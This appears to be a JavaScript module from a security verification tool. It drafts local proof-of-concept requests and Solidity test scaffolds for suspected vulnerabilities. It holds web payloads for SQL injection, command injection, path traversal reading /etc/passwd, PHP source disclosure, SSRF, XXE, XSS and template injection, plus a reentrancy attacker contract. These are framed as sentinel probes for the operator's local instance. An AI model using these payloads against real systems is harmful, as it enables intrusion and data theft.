// Local proof-of-concept generators.
//
// Each survivor gets a PoC the human can run locally: a Foundry test / Echidna
// property for contracts, or a LOCAL-instance HTTP request for web classes.
// Web payloads are always aimed at the operator's LOCAL instance and are framed
// as drafts for the human — the tool never fires them at a live third-party
// target, and live reachability is confirmed by the human, outside this tool.

import { truncate } from "./io.mjs";

// Class-specific payload for the web PoC / Q1 request. `token` is a per-run
// sentinel the operator can grep for in responses and local side effects.
export function payloadFor(vulnClass, token) {
  switch (vulnClass) {
    case "sql-injection":
      return { true: "' OR '1'='1' -- ", false: "' OR '1'='2' -- ", note: "boolean differential; compare the two responses" };
    case "command-injection":
      return { inject: `; echo VERIFY-${token} ;`, marker: `VERIFY-${token}`, note: "sentinel echoed on command execution" };
    case "path-traversal":
      return { raw: "../../../../../../etc/passwd", encoded: "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", marker: "root:", note: "out-of-root file content" };
    case "file-inclusion":
      return { filter: "php://filter/convert.base64-encode/resource=index.php", traversal: "../../../../etc/passwd", note: "unintended file content / base64 source" };
    case "ssrf":
      return { canary: `http://127.0.0.1:{CANARY_PORT}/verify-${token}`, marker: `verify-${token}`, note: "observe the fetch on a LOCAL canary server" };
    case "prototype-pollution":
      return { body: `{"__proto__":{"verifyPolluted":"${token}"}}`, marker: token, note: "check an unrelated object gains verifyPolluted" };
    case "template-injection":
      return { probe: "{{7*7}}", alt: "${7*7}", marker: "49", note: "evaluated arithmetic in the response" };
    case "xss":
      return { probe: `"><svg onload="/*VERIFY-${token}*/"><!--`, marker: `VERIFY-${token}`, note: "reflected unencoded in HTML" };
    case "xxe":
      return {
        body: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:{CANARY_PORT}/verify-${token}">]><r>&x;</r>`,
        marker: `verify-${token}`,
        note: "entity resolved; observe the fetch on a LOCAL canary",
      };
    case "insecure-deserialization":
      return { placeholder: "<gadget-specific serialized payload writing a local sentinel file>", marker: token, note: "gadget is target-specific; craft against the deserialized type" };
    case "broken-access-control":
      return { note: "two-account differential: authenticate as user A, request user B's resource id; expect B's data" };
    default:
      return { note: "class-specific payload to be completed by the operator" };
  }
}

// A LOCAL-only HTTP request draft. Route/method cannot be inferred from static
// analysis alone, so they are placeholders anchored to the candidate file:line.
export function buildHttpRequest(candidate, { baseUrl = "", token = "TOKEN" } = {}) {
  const target = baseUrl || "http://127.0.0.1:PORT";
  const payload = payloadFor(candidate.vulnClass, token);
  const lines = [
    `# LOCAL-ONLY request — run against your local instance only (${target}).`,
    `# Candidate sink: ${candidate.file}:${candidate.line}  [${candidate.vulnClass}]`,
    `# Map the sink to its route; <METHOD>/<PATH>/<PARAM> are placeholders.`,
    `#`,
    `# Payload(s): ${JSON.stringify(payload)}`,
  ];

  if (candidate.vulnClass === "sql-injection") {
    lines.push(
      `curl -s "${target}/<PATH>?<PARAM>=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\\"${payload.true}\\"))")"`,
      `curl -s "${target}/<PATH>?<PARAM>=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\\"${payload.false}\\"))")"`,
      `# Confirm: the two responses differ (boolean-based) — ${payload.note}.`,
    );
  } else if (candidate.vulnClass === "command-injection") {
    lines.push(
      `curl -s "${target}/<PATH>" --data-urlencode "<PARAM>=${payload.inject}"`,
      `# Confirm: "${payload.marker}" appears in the response or a local side effect.`,
    );
  } else if (candidate.vulnClass === "path-traversal" || candidate.vulnClass === "file-inclusion") {
    lines.push(
      `curl -s "${target}/<PATH>?<PARAM>=${payload.encoded ?? payload.traversal ?? payload.filter}"`,
      `# Confirm: out-of-root/unintended content ("${payload.marker ?? "unexpected file"}") returned.`,
    );
  } else if (candidate.vulnClass === "ssrf" || candidate.vulnClass === "xxe") {
    lines.push(
      `# Start a LOCAL canary: python3 -m http.server {CANARY_PORT}`,
      candidate.vulnClass === "ssrf"
        ? `curl -s "${target}/<PATH>" --data-urlencode "<PARAM>=${payload.canary}"`
        : `curl -s "${target}/<PATH>" -H "Content-Type: application/xml" --data '${payload.body}'`,
      `# Confirm: the canary logs a request for "/verify-${token}".`,
    );
  } else if (candidate.vulnClass === "prototype-pollution") {
    lines.push(
      `curl -s "${target}/<PATH>" -H "Content-Type: application/json" --data '${payload.body}'`,
      `# Confirm: a later unrelated object/response exposes "verifyPolluted".`,
    );
  } else if (candidate.vulnClass === "template-injection") {
    lines.push(
      `curl -s "${target}/<PATH>" --data-urlencode "<PARAM>=${payload.probe}"`,
      `# Confirm: the response contains "${payload.marker}" (server evaluated the template).`,
    );
  } else if (candidate.vulnClass === "xss") {
    lines.push(
      `curl -s "${target}/<PATH>" --data-urlencode "<PARAM>=${payload.probe}"`,
      `# Confirm: "${payload.marker}" is reflected unencoded in the HTML response.`,
    );
  } else if (candidate.vulnClass === "broken-access-control") {
    lines.push(
      `curl -s "${target}/<PATH>/<OTHER_USER_RESOURCE_ID>" -H "Authorization: Bearer <USER_A_TOKEN>"`,
      `# Confirm: user B's data is returned to user A — ${payload.note}.`,
    );
  } else {
    lines.push(`# ${payload.note}`);
  }

  return lines.join("\n");
}

// The drafted "Q1 attacker request": the natural-language attacker action from
// the template, plus the concrete local request/PoC pointer. Handed to the
// human to confirm live reachability and file — never auto-sent.
export function buildQ1Request(candidate, { baseUrl = "", token = "TOKEN" } = {}) {
  const isContract = candidate.stack === "solidity";
  const head = candidate.q1Template || `Exercise the candidate at ${candidate.file}:${candidate.line} and assert the property fails: ${candidate.property}`;
  if (isContract) {
    return [
      `Q1 (attacker action): ${head}`,
      `PoC: run the generated Foundry test (forge test) / Echidna property against a LOCAL fork or local deployment.`,
      `Handoff: confirm the finding, then the human confirms live reachability and files it.`,
    ].join("\n");
  }
  return [
    `Q1 (attacker action): ${head}`,
    `LOCAL request draft (run only against your local instance):`,
    buildHttpRequest(candidate, { baseUrl, token }),
    `Handoff: confirm locally, then the human confirms live reachability and files it.`,
  ].join("\n");
}

// Foundry PoC scaffold. Function signatures/contract name are target-specific
// (they need the ABI), so they are TODO placeholders; the assertion structure
// is class-specific.
export function buildFoundryPoc(candidate) {
  const header = [
    "// SPDX-License-Identifier: UNLICENSED",
    "pragma solidity ^0.8.19;",
    "",
    'import {Test} from "forge-std/Test.sol";',
    `// verify-loop PoC for ${candidate.vulnClass}`,
    `// candidate: ${candidate.file}:${candidate.line}`,
    `// property to violate: ${truncate(candidate.property, 160)}`,
    `// TODO: import the target contract and set the correct constructor/selector.`,
    `// import {Target} from "../<path-to-target>.sol";`,
    "",
  ];

  if (candidate.vulnClass === "reentrancy") {
    return [
      ...header,
      "contract Attacker {",
      "    address public target;",
      "    uint256 public count;",
      "    constructor(address _t) { target = _t; }",
      "    function attack() external payable {",
      "        // TODO: call the vulnerable entry point",
      "        (bool ok,) = target.call{value: msg.value}(abi.encodeWithSignature(\"vulnerableFn()\"));",
      "        require(ok, \"initial call failed\");",
      "    }",
      "    receive() external payable {",
      "        if (count < 1) { count++; target.call(abi.encodeWithSignature(\"vulnerableFn()\")); }",
      "    }",
      "}",
      "",
      "contract ReentrancyPoC is Test {",
      "    function test_reentrancy_breaks_accounting() public {",
      "        // TODO: deploy Target, fund it, deploy Attacker(address(target))",
      "        // uint256 before = address(target).balance;",
      "        // attacker.attack{value: 1 ether}();",
      "        // assertLt(address(target).balance, before - 1 ether, \"reentrancy drained more than deposited\");",
      "        emit log(\"Complete the TODOs, then this test should FAIL on a vulnerable target (i.e. the exploit succeeds).\");",
      "    }",
      "}",
      "",
    ].join("\n");
  }

  if (candidate.vulnClass === "missing-access-control" || candidate.vulnClass === "unprotected-selfdestruct") {
    return [
      ...header,
      "contract AccessControlPoC is Test {",
      "    address attacker = address(0xBAD);",
      "    function test_unprivileged_call_mutates_protected_state() public {",
      "        // TODO: deploy Target as the deployer/owner",
      "        vm.prank(attacker);",
      "        // Target(target).privilegedFn(); // should revert on a safe contract",
      "        // assertEq(Target(target).owner(), attacker, \"unprivileged caller took ownership\");",
      "        emit log(\"Complete the TODOs; a vulnerable target lets the unprivileged prank succeed.\");",
      "    }",
      "}",
      "",
    ].join("\n");
  }

  return [
    ...header,
    "contract VerifyPoC is Test {",
    `    // Class: ${candidate.vulnClass}`,
    "    function test_property_violation() public {",
    "        // TODO: construct the attacker transaction sequence that violates the property above,",
    "        //       then assert the violated post-condition. A vulnerable target makes the assertion hold.",
    `        emit log("PoC scaffold for ${candidate.vulnClass} — complete the attacker sequence.");`,
    "    }",
    "}",
    "",
  ].join("\n");
}

// Echidna property contract scaffold (invariant that should never break).
export function buildEchidnaPoc(candidate) {
  return [
    "// SPDX-License-Identifier: UNLICENSED",
    "pragma solidity ^0.8.19;",
    `// Echidna property for ${candidate.vulnClass} @ ${candidate.file}:${candidate.line}`,
    `// property: ${truncate(candidate.property, 160)}`,
    "contract EchidnaProperty {",
    "    // TODO: wire the target and seed state.",
    "    function echidna_property_holds() public view returns (bool) {",
    "        // Return the invariant that must always hold. Echidna tries to break it.",
    "        return true; // TODO: replace with the real accounting/authorization invariant",
    "    }",
    "}",
    "",
  ].join("\n");
}

// Select the right PoC artifact(s) for a candidate based on its `poc` kind.
export function buildPoc(candidate, { baseUrl = "", token = "TOKEN" } = {}) {
  const q1 = buildQ1Request(candidate, { baseUrl, token });
  switch (candidate.poc) {
    case "foundry":
      return { kind: "foundry", filename: `${candidate.id}.t.sol`, content: buildFoundryPoc(candidate), q1 };
    case "echidna":
      return { kind: "echidna", filename: `${candidate.id}.echidna.sol`, content: buildEchidnaPoc(candidate), q1 };
    case "http-request":
      return { kind: "http-request", filename: `${candidate.id}.http.txt`, content: buildHttpRequest(candidate, { baseUrl, token }), q1 };
    default:
      return { kind: "script", filename: `${candidate.id}.poc.txt`, content: q1, q1 };
  }
}
